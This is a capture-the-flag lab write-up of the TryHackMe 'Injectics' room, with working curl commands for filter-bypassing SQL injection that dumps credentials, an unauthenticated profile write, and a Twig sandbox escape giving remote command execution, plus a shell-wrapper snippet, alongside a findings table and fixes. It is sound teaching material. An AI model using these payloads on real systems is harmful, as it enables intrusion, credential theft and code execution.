---
description: "TryHackMe Injectics — a SQL injection hidden behind a browser-only blacklist, a server-side filter that recreates the keywords it deletes, an unauthenticated profile writer, and a Twig sandbox that checks three filters and forgets the fourth. Includes the five wrong turns, one of which cost half the engagement."
---

# Injectics — when the filter is the vulnerability

**TryHackMe · room: Injectics · target: `10.129.154.82` (web)**

> **Both flags are redacted** here as `THM{[redacted]}`, and so is every real credential value.
> Everything else is intact: every command, every flag on every command, the exact filter behaviour,
> the payloads, the error messages, and all five wrong turns.
>
> **What I kept and why:** the vulnerable source code, the sanitiser's exact keyword list, the
> doubling trick that defeats it, the hidden filenames, the Twig sandbox whitelist, and the escape.
> Those are the technique. The flag strings and the password strings are just proof you were there —
> you still have to run the chain to get them, which is the exercise.

The room's brief is one sentence: *"Can you utilise your web pen-testing skills to safeguard the
event from any injection attack?"* The room name says injection twice. It is still worth enumerating
properly, because "injection" covers SQL, command, LDAP, XPath and template injection, and this box
turns out to have **two different ones chained together**.

Here is the whole chain before the detail, because it reads better forwards than it was found:

1. The login's SQL-injection blacklist runs **in the browser**. `curl` never loads it.
2. The server has its own blacklist. It deletes `AND`, `OR` and `UNION` — **once**. Deleting the
   middle of `oorr` leaves `or`. It never filters `SELECT` at all.
3. That gives a UNION dump of the `users` table: two accounts, **plaintext** passwords.
4. An **unauthenticated** `update_profile.php` — in no wordlist — rewrites any user's name field.
5. `dashboard.php` concatenates that name into **Twig template source**, so the name is code. SSTI.
6. Twig's sandbox blocks the `filter`, `map` and `reduce` callables and **forgets `sort`**. RCE.

---

## Reconnaissance

Two open ports, and only one of them interesting.

```bash
nmap -sT -p- --min-rate 1000 -T4 -Pn -oN nmap-allports.txt 10.129.154.82
```

What each flag does, since none of this is obvious the first time:

- A **port** is a numbered channel on a machine; a service listens on one and replies to whatever
  connects. There are 65,535 of them.
- `-sT` — **connect scan**: complete a normal TCP handshake, exactly as a browser would. The faster
  default `-sS` needs raw network access, which needs root. `id -u` said `1000`, not `0`, so `-sS`
  would have failed instantly. Check this *before* queueing a long scan.
- `-p-` — all 65,535 ports, not nmap's default top-1000.
- `--min-rate 1000` — at least 1000 packets per second, so it finishes in about a minute.
- `-T4` — "aggressive" timing. Fine over a lab VPN.
- `-Pn` — do not ping first. Many hosts drop ping, and without this nmap decides they are down and
  scans nothing.
- `-oN file` — save the output. Do this always; scratch directories get wiped.

```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http  Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Injectics Leaderboard
|_http-cookie-flags: PHPSESSID: httponly flag not set
```

An Olympics-style leaderboard in PHP. That missing `HttpOnly` flag on the session cookie is already
a (minor) finding: it means any JavaScript running on the page can read the session ID.

---

## Read the JavaScript before you fuzz anything

`login.php` has a form whose fields are `mail` and `pass` — and **no `action=` attribute**. A form
with no action posts back to its own URL, unless JavaScript intercepts it. So the JavaScript is the
API documentation. Fetch it:

```bash
curl -s http://10.129.154.82/script.js
```

```js
$("#login-form").on("submit", function(e) {
    e.preventDefault();
    var username = $("#email").val();
    var password = $("#pwd").val();

    const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
    for (let keyword of invalidKeywords) {
        if (username.includes(keyword)) {
            alert('Invalid keywords detected');
            return false;
        }
    }

    $.ajax({
        url: 'functions.php', type: 'POST',
        data: { username: username, password: password, function: "login" },
        dataType: 'json', ...
    });
});
```

Eleven lines, two gifts:

1. **The real endpoint is `functions.php`**, and its parameters are `username`, `password`,
   `function` — not the form's `mail`/`pass`. Attacking `login.php` with `mail=` would have been
   attacking nothing.
2. **The SQL-injection filter runs in the victim's browser.** That is not a filter. It is a note to
   the attacker saying which words the developer was worried about. `curl` does not execute
   JavaScript, so every one of those keywords can be sent freely.

This is the single most common real-world version of "we sanitise our input", and it is worth
internalising: **validation that the client can skip is not validation.** It is a usability feature.

---

## Finding the injection: build the oracle first

An **oracle** is whatever lets you tell "true" from "false" in the responses. Without one you are
typing blind. So before any payload, send known-good and known-bad input and see how they differ:

```bash
curl -sS -X POST http://10.129.154.82/functions.php \
     -d 'function=login&username=nosuchuser@example.com&password=wrongpass'
```

| input | response |
|---|---|
| nonsense user / nonsense password | `{"status":"error","message":"Invalid email or password"}` |
| plausible user / wrong password | `{"status":"error","message":"Invalid email or password"}` |
| empty / empty | `{"status":"error","message":"Invalid email or password"}` |
| `username=x'` | `{"status":"error","message":"Invalid email or password"}` |

Identical every time. No SQL error text leaks, and the message does not distinguish "no such user"
from "wrong password" — which is good practice by the developer, and means **the message is not an
oracle**. Eight standard bypasses (`' OR '1'='1`, `admin'-- -`, `' OR 1=1#`, `x' UNION SELECT 1,2,3-- -`)
all returned that same string.

**Wrong turn #1:** I nearly concluded the login was safely parameterised and went looking elsewhere.
It was not. My oracle was blind, which is not the same thing as the target being secure.

### Make the clock talk

When the message will not talk, time the response. `SLEEP(n)` is a MySQL function that pauses for
`n` seconds. If a reply arrives `n` seconds late, my text reached the SQL engine.

```bash
curl -sS -o /dev/null -w 'time=%{time_total}\n' --max-time 30 \
     -X POST http://10.129.154.82/functions.php \
     --data-urlencode "username=<payload>" -d 'password=x&function=login'
```

- `-o /dev/null` throws the body away — only the timing matters here.
- `-w 'time=%{time_total}'` prints curl's own measurement of the round trip.
- `--data-urlencode` percent-encodes the payload so quotes and spaces survive the POST body intact.
  Plain `-d` would mangle them.

| payload in `username` | time |
|---|---|
| `baseline@example.com` | 0.044 s |
| `' OR SLEEP(5)-- -` | 0.045 s |
| `x' AND SLEEP(5)-- -` | 0.045 s |
| **`x' oorr SLEEP(5)-- -`** | **10.04 s** |
| **`x' \|\| SLEEP(5)-- -`** | **10.05 s** |
| `x' aandnd SLEEP(5)-- -` | 0.042 s |

Three separate facts come out of that table, and all three matter:

**1. SQL injection exists.** Confirmed by measurement, not by hope.

**2. The server strips keywords exactly once.** `oorr` is `o` + `or` + `r`. Delete the inner `or`
and what remains is… `or`. This is the classic failure mode of blacklist sanitising: **removing a
forbidden word from a string can create that word.** The same trick gives `aandnd` → `and` and
`uniunionon` → `union`.

**3. `aandnd` not sleeping is not a failure.** It becomes `x' and SLEEP(5)`. Because `email='x'` is
false, MySQL short-circuits the `AND` and never evaluates `SLEEP`. Knowing *why* a negative is
negative matters as much as reading a positive — otherwise you waste an hour "fixing" a payload that
was already correct.

One more thing to file away: **the sleep is doubled**. A 5-second sleep costs 10 seconds, so the
application runs its query **twice per login**. That detail explains something important later.

`-- -` is a SQL comment: `--`, a space, then a dash so the trailing space cannot be trimmed away.
Everything after it is ignored — which is how the password half of the `WHERE` clause disappears.

### The bypass

```bash
curl -sS -X POST http://10.129.154.82/functions.php \
     --data-urlencode "username=' oorr 1=1-- -" -d 'password=x&function=login'
```

```json
{"status":"success","message":"Login successful","is_admin":"true",
 "first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
```

Logged in with no password at all. Adding `LIMIT 1 OFFSET n` walks the table row by row — offset 0
is `dev`, offset 1 is `admin`, offset 2 is empty. **Two users.**

---

## The wrong turns

A clean narrative here would be dishonest, and the fourth and fifth ones are the actual lesson of
this room.

### #2 — fuzzing a dispatcher that does not dispatch

`script.js` sends `function: "login"`, which looks like a router, so I fuzzed that parameter for
other verbs. The control run printed **nothing** — `function=login` alone returns an empty body,
because the handler only fires when `username` *and* `password` are present. Supplying them made
**every** value match, including `zzznotrealzzz`.

Two runs, two useless results in opposite directions. The truth: `functions.php` ignores `function`
entirely and branches on whether `username` and `password` exist.

**Rule:** a fuzz whose control fails and a fuzz where everything matches are the same result — zero
information. Fix the oracle before you read the output.

### #3 — a false positive treated as a discovery

A larger sweep with `directory-list-2.3-medium.txt` reported `admindlNIvgQD`, which looks exactly
like a deliberately obscured admin path. Re-requesting it by hand returned `404` every time, with and
without a trailing slash and with `.php`. It was auto-calibration noise.

**Rule:** a hit from an automated sweep is a *candidate*. Re-request it by hand before building on it.

### #4 — reading a `200` as SQL breakage

`edit_leaderboard.php` answers `302` (redirect) on a successful edit. Sending `gold=22'` returned
`200`, and I read that as "my quote broke the query". Then I ran the differential I should have run
first:

| input | response |
|---|---|
| `gold=22` | 302 |
| `gold=-5` | 302 |
| `gold=22.5` | 302 |
| `gold=abc` | **200** |
| `gold=22abc` | **200** |
| `gold=` (empty) | **200** |

`abc` contains no quote and still fails. That is **numeric validation**, not a broken query. The edit
form was never injectable: `rank` is numeric-validated too, and `country` is not used in the query at
all — I set rank 6's country to `NOTREALCOUNTRY` and the row updated anyway.

**Rule (and I had written it down before starting):** confirm what an error *means* with known-good
and known-bad input before acting on it. A status code is a symptom, not a diagnosis.

### #5 — the expensive one: assuming the server copied the browser's list

This one cost more than everything else combined, and it is the most instructive thing in the room.

The browser blacklist is `['or','and','union','select','"',"'"]`. `oorr` worked. So I assumed the
server ran the same list and doubled **everything**:

```
zzz' uniunionon seselectlect 1,2,3,4,5,6-- -     -> error at every column count 1..10
' oorr (seselectlect SLEEP(3))-- -               -> no sleep
' oorr (selselectect 1)=1-- -                    -> false
```

I concluded `SELECT` was blocked by something stronger than the strip, abandoned UNION entirely, and
went the long way round: blind extraction one character at a time, `LOAD_FILE` (no usable FILE
privilege — `secure_file_priv` confines it to `/var/lib/mysql-files/`), stacked queries (`DO SLEEP(3)`
— unsupported), a second-order injection theory (the second query is parameterised), and an
18,011-word column-name brute force.

Eventually I tested the keywords **one at a time** instead of all at once:

| test | result |
|---|---|
| `1=2 or 1=1` | False — filtered |
| `1=2 oorr 1=1` | True — doubling restores it |
| `1=1 and 1=1` | False — filtered |
| `1=1 aandnd 1=1` | True |
| **`(select 1)=1`** | **True — never filtered at all** |
| `1=(select 1 union select 1 limit 1)` | False — filtered |
| `1=(select 1 uniunionon select 1 limit 1)` | True |

`SELECT` was never filtered. By doubling it I was **creating** the corruption. `seselectlect` is a
correct bypass for a filter that strips `select`, and pure garbage for one that does not. My bypass
*was* the bug.

**Rule: test each element of a defence separately before combining them.** A combined payload that
fails tells you nothing about which part failed — and a bypass aimed at a filter that does not exist
is just a typo you introduced on purpose.

There is a smaller cousin of this worth knowing. My column-name brute force reported that
`users.password` did not exist. It does. The word **pass·<u>or</u>·d** contains `or`, so the server's
`str_ireplace` ate it and the query actually asked about `users.passwd`. The same filter made
`author` a false *positive*, because `author` minus `or` is `auth`, which is a real column.
**A keyword-stripping filter mangles your reconnaissance vocabulary, not just your payloads.**

---

## UNION, correctly

Column count first. `ORDER BY n` sorts by the *n*-th column and errors if there is no such column, so
it counts columns without needing any output:

```bash
curl -sS -X POST http://10.129.154.82/functions.php \
  --data-urlencode "username=' oorr 1=1 oorrder by 6-- -" -d 'password=x&function=login'
```

(`order` contains `or`, so it needs doubling too — `oorrder`.) Six works, seven fails: **six columns**.

```bash
curl -sS -X POST http://10.129.154.82/functions.php \
  --data-urlencode "username=zzz@zzz' uniunionon select 'c1','c2','c3','c4','c5','c6'-- -" \
  -d 'password=x&function=login'
```

```json
{"status":"success","first_name":"c2","last_name":"c3", ...}
```

Column 2 lands in `first_name`, column 3 in `last_name`. Those two fields are now a window into the
database. Pointing them at `information_schema`, MySQL's built-in catalogue of its own structure
(note `information` contains `or`, so it must be written `infoorrmation_schema`):

```
database()  : bac_test
@@version   : 8.0.41-0ubuntu0.20.04.1
current_user: root@localhost
tables      : leaderboard, users
users cols  : email, fname, lname, password, reset_token, auth
```

The web application connects to MySQL **as root** — a finding in its own right. Dumping the table
with `group_concat` (which folds many rows into one string, so it fits in a single field):

```
dev@injectics.thm        : dev   : dev  : [redacted] : 983084 : 1
superadmin@injectics.thm : admin : NULL : [redacted] : NULL   : 0
```

**Passwords stored in plaintext.** `dev`'s works at the normal login. `superadmin`'s does not — and
the reason turns out to be a hard-coded special case in the source:

```php
if ($email == "superadmin@injectics.thm") { return false; }
```

Here is the vulnerable function in full, recovered later. It is worth reading, because everything
measured above is visible in it:

```php
function checkLogin($email, $password) {
    $conn = db_connect();
    if (is_sqlmap_request()) { http_response_code(403); die('Forbidden: SQLmap detected.'); }

  /*  $stmt = $conn->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
      $stmt->bind_param("ss", $email, $password);
      $stmt->execute();  */
    if ($email == "superadmin@injectics.thm") { return false; }

    $email    = str_ireplace(["AND", "OR", "UNION"], "", $email);
    $password = str_ireplace(["AND", "OR", "UNION"], "", $password);

    $sql = "SELECT * FROM users WHERE email='$email' AND password='$password'";
    $result = $conn->query($sql);
    ...
    $_SESSION['role'] = "dev";
```

Three keywords, one pass, no `SELECT` — because the query itself begins with `SELECT` and stripping
it would break the application. **And the prepared statement, the actual fix, is sitting right there
commented out.** The blacklist is not a weaker version of the fix; it is what *replaced* the fix.

Note also `is_sqlmap_request()`, which rejects any request whose headers mention `sqlmap`:

```php
if (strpos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') !== false) return true;
foreach ($_SERVER as $key => $value) { if (stripos($value, 'sqlmap') !== false) return true; }
```

Trivially defeated with `--random-agent`. But doing this room by hand is what surfaced the
`select`-was-never-filtered fact — automation would have found the injection instantly and taught me
nothing about the filter.

---

## Finding somewhere to write

The dashboard greets you with `Welcome, <first_name>!`. But a `first_name` supplied through the UNION
renders **empty**, because `dashboard.php` ignores the login response and **re-queries the database**
using the session's email address. That is the second query the doubled `SLEEP` revealed.

Proof, by setting UNION column 1 (the email) to different values:

| UNION column 1 | dashboard shows |
|---|---|
| `dev@injectics.thm` | `Welcome, dev!` |
| `superadmin@injectics.thm` | `Welcome, admin!` |
| `zzz@zzz` | `Welcome, !` |

So the rendered name comes from the **database**, and controlling it means **writing** to the
database. The login injection lives inside a `SELECT`; stacked queries are not supported; and
`INTO OUTFILE` cannot reach the webroot because `secure_file_priv` is set. So: find a page that
writes.

Here is the part that matters methodologically. **`edit_leaderboard.php` exists, and neither
`dirb/common.txt` nor `directory-list-2.3-medium.txt` contains it.** That is evidence the *wordlists
are wrong for this application*, not evidence the application is small. Standard English wordlists do
not contain `verb_noun.php` names from someone else's codebase.

So generate candidates from the app's own vocabulary instead:

```python
verbs = ["edit","add","update","reset","delete","view","manage","change","create","remove", ...]
nouns = ["leaderboard","user","users","password","profile","admin","flag","token","score", ...]
# emit verb_noun.php, verb-noun.php, verbnoun.php, noun_verb.php   -> 2426 candidates
# plus edit_leaderboard.php as a positive control and a fake as a negative control
```

```bash
ffuf -u http://10.129.154.82/FUZZ -w combos.txt -t 25 -mc 200,301,302,403
```

- `FUZZ` is the placeholder each wordlist line is substituted into.
- `-t 25` — 25 threads. More will knock over a single-vCPU lab VM, and then you are debugging your
  own traffic instead of the target.
- `-mc` — **match** these status codes (rather than filtering others out).

Two hits: `edit_leaderboard.php` (my control — the sweep works) and one new name:

**`update_profile.php`** — a profile editor taking `email`, `fname` and `lname`, with **no
authentication whatsoever**. It rewrites any user's record, identified only by the email address you
hand it.

```bash
curl -sS -X POST http://10.129.154.82/update_profile.php \
     -d 'email=dev@injectics.thm' -d 'fname=TESTNAME' -d 'lname=dev'
# dashboard now reads: Welcome, TESTNAME!
```

It is properly parameterised — I tested `SLEEP` payloads in all three fields, no injection — and it
ignores extra fields like `auth`, so no mass assignment. It does exactly one thing correctly and
safely. That one thing is a catastrophe, because of what reads the value.

---

## Server-side template injection

```
fname={{7*7}}       ->  Welcome, 49!
fname={{"a"~"b"}}   ->  Welcome, ab!
fname=${7*7}        ->  Welcome, ${7*7}!
```

`49` is the proof: the server **computed** rather than printed. And `${7*7}` staying literal confirms
it is Twig syntax specifically, not some generic evaluator.

The cause, from `dashboard.php`:

```php
$dynamicTemplate = $twig->createTemplate("Welcome, " . $fname . "!");
echo $dynamicTemplate->render([]);
```

The name is concatenated into the **template source**, so whatever it contains is *code*. The fix is
one line — make it a variable:

```php
$twig->createTemplate("Welcome, {{ name }}!")->render(['name' => $fname]);
```

That is the whole distinction behind SSTI: **template source is code; template variables are data.**

### The sandbox, and reading its error messages as a map

Every textbook Twig RCE payload failed — but each failure named its own reason, which is a gift:

```
{{ ["id"]|filter("system") }}   -> The callable passed to "filter" filter must be a Closure in sandbox mode
{{ [0]|reduce("system","id") }} -> The callable passed to the "reduce" filter must be a Closure in sandbox mode
{{ source('/etc/passwd') }}     -> Function "source" is not allowed
{{ include('/etc/passwd') }}    -> Function "include" is not allowed
{{ _context|keys }}             -> Filter "keys" is not allowed
{% set x = 1 %}                 -> Tag "set" is not allowed
```

Twig's **sandbox** is enabled with a whitelist. Enumerating it — request every built-in, sort
"is not allowed" from everything else — gives the complete policy:

- **filters:** `upper`, `escape`, `raw`, `length`, `join`, `sort`, `filter`, `map`, `reduce`
- **functions:** `attribute`, `template_from_string`
- **tags:** `for`, `if` (not `set`, `do`, `apply`)
- `_context` contains only `_parent` — no objects to pivot through

### The escape

Read that error list once more. `filter` refused a string callable and said so. `reduce` refused and
said so. **`sort` said nothing at all.** Earlier, `{{ ["id",0]|sort("system") }}` had returned the
bare word `Array` — no error, no output — and I had moved past it. That silence was the finding.

Twig's `sort` compiles down to PHP's `usort($array, $callable)`, and `usort` only invokes the
comparator when there are **at least two elements** to compare. My array had two, so it *was* called
as `system("id", 0)` — but `system()`'s second parameter is by-reference, so passing a literal `0`
made it fail before printing anything. Swap in `passthru`, which tolerates being called that way:

```
fname={{ ["id","x"]|sort("passthru") }}
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Remote code execution.** The sandbox validates the callable for `filter`, `map` and `reduce` and
forgets `sort` — the same class of bug as CVE-2022-23614, one filter short of complete.

Wrapping the output in a marker makes it a usable shell, since it comes back embedded in the page's
HTML:

```python
payload = '{{ ["echo ___X___; %s; echo ___X___","x"]|sort("passthru") }}' % cmd
# POST as fname to update_profile.php, GET dashboard.php, split the body on the marker
```

---

## What was on the box

`ls -la /var/www/html` found considerably more than any web sweep:

```
adminLogin007.php     7370   <- the admin login. Unlinked, and in no wordlist.
injecticsService.php  3947   <- a self-healing cron service
mail.log              1098   <- a plaintext email
conn.php              2867
.conn.php.swp         1024   <- an abandoned vim swap file
flags/<32-hex>.txt      38   <- flag 1
```

**Flag 1** is that text file. Its directory returns `403` because `.htaccess` sets `Options -Indexes`,
but the file itself serves fine over HTTP *once you know its name* — and the name is a random MD5, so
no wordlist will ever produce it. One `ls` found it instantly. This is the lesson from an earlier
room restated: **with a read primitive but no directory listing, read something that describes the
filesystem** rather than guessing filenames.

`mail.log` is the room's intended hint, and it is a nice piece of design:

> I have configured the service to automatically insert **default credentials** into the `users` table
> if it is ever deleted or becomes corrupted. […] I have scheduled the service to run every minute.
>
> | Email | Password |
> |---|---|
> | `superadmin@injectics.thm` | `[redacted]` |
> | `dev@injectics.thm` | `[redacted]` |

`injecticsService.php` confirms it and, for good measure, hard-codes the MySQL root password in a
file served by the webserver. **The intended route to flag 2 is to drop the `users` table, wait sixty
seconds for the service to rebuild it with those documented defaults, then log in as superadmin.**

I did not do that, and the reason is worth stating: **the live passwords were already readable
through the UNION injection**, so dropping a table on a shared lab box would have been destructive
for no gain. Same destination, nothing broken. (If you want the intended path, it is
`'; DROP TABLE users-- -` territory via a write primitive — but note the login injection is a
`SELECT` with no stacked queries, so the room expects you to use the service's own behaviour rather
than SQL to destroy it.)

`adminLogin007.php` is the door that matters, and it deserves a close read because it is the one
place the developer got the important thing right:

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
$stmt->bind_param("ss", $email, $password);
...
$_SESSION['role'] = "admin";
```

A **prepared statement**: the query structure is sent to MySQL first, the values afterwards, so user
input can never become SQL syntax. No injection, no bypass — you need genuine credentials, which the
UNION dump had already provided.

The irony is instructive. That same file wraps the safe query in a `sanitize_input()` that strips
`union select or and ' " -- # ;` and `SLEEP`, then `preg_replace('/[^A-Za-z0-9@.]/','')` for good
measure. **All of that is unnecessary** — the prepared statement already made it safe. And none of it
would have saved `functions.php`, which has the same prepared statement commented out above a string
concatenation. The developer wrote the defence in the file that did not need it and deleted it from
the file that did.

```bash
curl -sS -c admin.txt -X POST http://10.129.154.82/adminLogin007.php \
     --data-urlencode 'mail=superadmin@injectics.thm' --data-urlencode 'pass=[redacted]'
# 302 -> dashboard.php
curl -sS -b admin.txt http://10.129.154.82/dashboard.php | grep -oE 'THM\{[^}]*\}'
```

**Flag 2.** It is hard-coded in `dashboard.php` behind `if ($_SESSION['role'] == "admin")`, and
`role` is set to `"admin"` in exactly one file — `adminLogin007.php`. `functions.php` always sets it
to `"dev"`. **No amount of SQL-injection bypassing at the main login could ever have printed it**,
which is why the room has two flags: they are two genuinely different vulnerabilities, not one bug
counted twice.

---

## Findings

| # | Finding | Severity | Where |
|---|---|---|---|
| 1 | SQL injection in login — string concatenation; prepared statement present but commented out | Critical | `functions.php` |
| 2 | Input validation implemented only in client-side JavaScript | High | `script.js` |
| 3 | Single-pass `str_ireplace` blacklist — deleting a keyword can recreate it | High | `functions.php` |
| 4 | Unauthenticated write to any user's profile | Critical | `update_profile.php` |
| 5 | SSTI — user data concatenated into Twig template source | Critical | `dashboard.php` |
| 6 | Twig sandbox does not validate the `sort` filter's callable → RCE | Critical | Twig 2.14.0 |
| 7 | Passwords stored in plaintext | High | `users` table |
| 8 | Web application connects to MySQL as `root` | High | `conn.php` |
| 9 | Database root password hard-coded in a web-served file | High | `injecticsService.php` |
| 10 | Cron service restores known default credentials every minute | Medium | `injecticsService.php` |
| 11 | Security by obscurity — `adminLogin007.php` unlinked but publicly reachable | Medium | webroot |
| 12 | Editor swap file `.conn.php.swp` left in the webroot | Medium | webroot |
| 13 | Session cookie missing `HttpOnly` | Low | Apache/PHP |

---

## What this room actually teaches

**A blacklist is not a fix; it is what people write instead of the fix.** Every single failure here
is a variation on that. The prepared statement was commented out and replaced with `str_ireplace`.
The keyword list ran in the browser where the attacker controls it. The server's list deleted three
words in one pass, so doubling them restored them, and left out the fourth word entirely because
removing it would have broken the app. The Twig sandbox enumerated three filters to guard and missed
the fourth. `adminLogin007.php` piled a useless sanitiser on top of a prepared statement that had
already solved the problem.

Allowlists — prepared statements, template variables instead of template source, an explicit list of
permitted values — fail *closed*. Blacklists fail open, quietly, at whatever their author did not
think of. And what their author did not think of is exactly what you are looking for.

The methodological lessons I paid for, in the order they hurt:

1. **Read the client-side JavaScript before fuzzing anything.** It documents the API and names the
   developer's fears.
2. **Build an oracle before writing a payload.** If the message will not vary, time the response.
3. **Confirm what an error *means*** with known-good and known-bad input. `200` meant "not a number",
   not "broken SQL".
4. **Test each element of a defence separately.** Doubling `select` against a filter that never
   touched `select` was self-inflicted, and it cost more than every other mistake combined.
5. **When a wordlist finds nothing, suspect the wordlist.** `edit_leaderboard.php` is in none of the
   standard ones. Generate candidates from the application's own vocabulary.
6. **Read the silence.** `filter` and `reduce` announced why they refused; `sort` said nothing, and
   that was the way in.
